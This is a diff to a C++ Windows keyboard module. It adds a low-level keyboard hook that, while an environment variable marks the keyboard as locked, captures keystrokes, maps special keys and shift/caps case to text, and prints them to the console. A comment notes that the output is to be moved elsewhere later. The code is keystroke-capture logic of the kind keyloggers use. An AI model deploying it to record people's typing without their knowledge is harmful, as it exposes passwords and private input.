@@ -2,8 +2,51 @@
 
 #define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for
 
+// map to track keystrokes that cannot be mapped with MapVirtualKeyExW
+std::map<int, std::wstring> mapSpecialKeys = { 
+	{VK_BACK, L"[BACKSPACE]" },
+	{VK_RETURN,	L"\n" },
+	{VK_SPACE,	L"_" },
+	{VK_TAB,	L"[TAB]" },
+	{VK_CONTROL,	L"[CONTROL]" },
+	{VK_LCONTROL,	L"[CONTROL]" },
+	{VK_RCONTROL,	L"[CONTROL]" },
+	{VK_MENU,	L"[ALT]" },
+	{VK_LWIN,	L"[LWIN]" },
+	{VK_RWIN,	L"[RWIN]" },
+	{VK_ESCAPE,	L"[ESCAPE]" },
+	{VK_END,	L"[END]" },
+	{VK_HOME,	L"[HOME]" },
+	{VK_LEFT,	L"[LEFT]" },
+	{VK_RIGHT,	L"[RIGHT]" },
+	{VK_UP,		L"[UP]" },
+	{VK_DOWN,	L"[DOWN]" },
+	{VK_PRIOR,	L"[PG_UP]" },
+	{VK_NEXT,	L"[PG_DOWN]" },
+	{VK_OEM_PERIOD,	L"." },
+	{VK_DECIMAL,	L"." },
+	{VK_OEM_PLUS,	L"+" },
+	{VK_OEM_MINUS,	L"-" },
+	{VK_ADD,		L"+" },
+	{VK_SUBTRACT,	L"-" },
+};
+
 HHOOK ghHook;
 KBDLLHOOKSTRUCT kbdStruct;
+
+// stores booleans for letter casing
+// caseStatus.first is the SHIFT key status
+// caseStatus.second is the CapsLock key status
+
+// +-------+------+------+
+// | SHIFT | CAPS | CASE |
+// +-------+------+------+
+// |     0 |    0 |    0 |
+// |     0 |    1 |    1 |
+// |     1 |    0 |    1 |
+// |     1 |    1 |    0 |
+// +-------+------+------+
+std::pair<bool, bool> caseStatus = std::make_pair<bool, bool>(0, 0);
 
 int KeyboardMod::requireAdmin() {
     return 0;
@@ -54,41 +97,27 @@ void logKeystroke(int vkCode) {
     // resolution and logging of the keystrokes is performed here
     // also ignores mouse inputs
 
-    HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
+    if(mapSpecialKeys.find(vkCode) != mapSpecialKeys.end()){
+        std::wstring key = mapSpecialKeys.at(vkCode);
 
-
-    // check for CapsLock
-    bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);
-
-    // check for Shift keys
-    if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) {
-        lowercase = !lowercase;
+        std::wcout << key << std::endl;
     }
 
-    char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
-    key = (lowercase) ? tolower(key) : key;
+    else {
+        
+        HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
 
-    // print to test functionality, MUST move to another location eventually
-    wprintf(L"%c\n", key);
+        char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
+        key = (caseStatus.first ^ caseStatus.second) ? key: tolower(key);
+
+        // print to test functionality, MUST move to another location eventually
+        wprintf(L"%c\n", key);
+
+    }
 }
 
 LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     // function handler for all keyboard strokes
-
-
-    // YR: I leave this here just in case u don't like this new logic
-    // size_t requiredSize;
-    // wchar_t *buffer;
-    // errno_t errNo = _wgetenv_s(&requiredSize, buffer, 0, KB_ENV);
-    // if(errNo || !requiredSize) {
-    //     // error handling if _wgetenv_s fails
-    //     // OR the required ENV is not set on the system
-    //     wprintf(L"%s\n", "[ERROR] Could not find the required environment value, exiting!");
-
-    //     releaseHook();
-
-    //     exit(1);
-    // }
 
     std::wstring buffer = getEnvVar(KB_ENV, L"0");
 
@@ -96,10 +125,30 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
     if(keyboardLocked) {
         if(nCode >= 0) {
-            if(wParam == WM_KEYDOWN) {
-                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+            int vkCode = kbdStruct.vkCode;
 
-                logKeystroke(kbdStruct.vkCode);
+            if(wParam == WM_KEYDOWN) {
+                
+                if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) { 
+                    caseStatus.first = 1;
+                    return 1;
+                }
+
+                if(vkCode == VK_CAPITAL) {
+                    caseStatus.second = !caseStatus.second;
+                    return 1;
+                }
+
+                logKeystroke(vkCode);
+            }
+            
+            if(wParam == WM_KEYUP) {
+                
+                if(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) { 
+                    caseStatus.first = 0;
+                    return 1;
+                }
             }
         }
 
